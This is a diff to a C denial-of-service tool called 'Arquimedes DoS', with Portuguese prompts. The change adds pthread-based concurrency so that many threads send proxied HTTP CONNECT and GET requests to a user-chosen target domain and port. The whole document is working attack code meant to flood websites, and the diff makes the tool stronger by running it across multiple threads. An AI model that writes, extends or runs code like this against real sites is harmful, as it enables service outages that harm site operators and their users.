@@ -5,6 +5,14 @@
 #include <netdb.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
+#include <pthread.h>
+
+char host[256];
+int port;
+int total_packets_per_thread;
+char proxy_ip[100];
+int proxy_port;
+int threads_count;
 
 void banner() {
     printf(
@@ -27,40 +35,19 @@ void banner() {
     );
 }
 
-int main() {
-    char host[256];
-    int port;
-    int total_packets;
-    char proxy_ip[100];
-    int proxy_port;
-
-    banner();
-
-    printf("∆tack DoS Arquimedes\n");
-    printf("Domínio do site -> ");
-    scanf("%255s", host);
-    printf("Porta do site -> ");
-    scanf("%d", &port);
-    printf("Quantidade de packtes -> ");
-    scanf("%d", &total_packets);
-    printf("Ip da sua proxy -> ");
-    scanf("%99s", proxy_ip);
-    printf("Porta da sua proxy -> ");
-    scanf("%d", &proxy_port);
-
-    printf("Ataque iníciado...\n");
-
+void *attack_thread(void *arg) {
     struct sockaddr_in proxy_addr;
     int sock;
     char request[1024];
+    int sent_packets = 0;
 
-    for (int i = 1; i <= total_packets; i++) {
+    proxy_addr.sin_family = AF_INET;
+    proxy_addr.sin_port = htons(proxy_port);
+    proxy_addr.sin_addr.s_addr = inet_addr(proxy_ip);
+
+    for (int i = 0; i < total_packets_per_thread; i++) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock < 0) continue;
-
-        proxy_addr.sin_family = AF_INET;
-        proxy_addr.sin_port = htons(proxy_port);
-        proxy_addr.sin_addr.s_addr = inet_addr(proxy_ip);
 
         if (connect(sock, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
             close(sock);
@@ -71,16 +58,52 @@ int main() {
                  "CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n",
                  host, port, host, port);
         send(sock, request, strlen(request), 0);
-        recv(sock, request, sizeof(request), 0); // ler resposta da proxy
+        recv(sock, request, sizeof(request), 0);
 
         snprintf(request, sizeof(request),
                  "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", host);
         send(sock, request, strlen(request), 0);
 
-        printf("Arquimedes DoS.c ---> %d Packtes enviados para %s porta %d\n", i, host, port);
+        sent_packets++;
+        printf("Arquimedes DoS.c ---> %d Packtes enviados para %s porta %d\n", sent_packets, host, port);
         close(sock);
-        usleep(100000); // delay de 0.1 segundos
+        usleep(100000);
     }
 
+    return NULL;
+}
+
+int main() {
+    banner();
+
+    printf("∆tack DoS Arquimedes\n");
+    printf("Domínio do site -> ");
+    scanf("%255s", host);
+    printf("Porta do site -> ");
+    scanf("%d", &port);
+    printf("Quantidade de packtes por thread -> ");
+    scanf("%d", &total_packets_per_thread);
+    printf("Ip da sua proxy -> ");
+    scanf("%99s", proxy_ip);
+    printf("Porta da sua proxy -> ");
+    scanf("%d", &proxy_port);
+    printf("Quantidade de threads -> ");
+    scanf("%d", &threads_count);
+
+    printf("Ataque iníciado...\n");
+
+    pthread_t threads[threads_count];
+
+    for (int i = 0; i < threads_count; i++) {
+        if (pthread_create(&threads[i], NULL, attack_thread, NULL) != 0) {
+            perror("Erro ao criar thread");
+        }
+    }
+
+    for (int i = 0; i < threads_count; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
+    printf("Ataque finalizado.\n");
     return 0;
 }
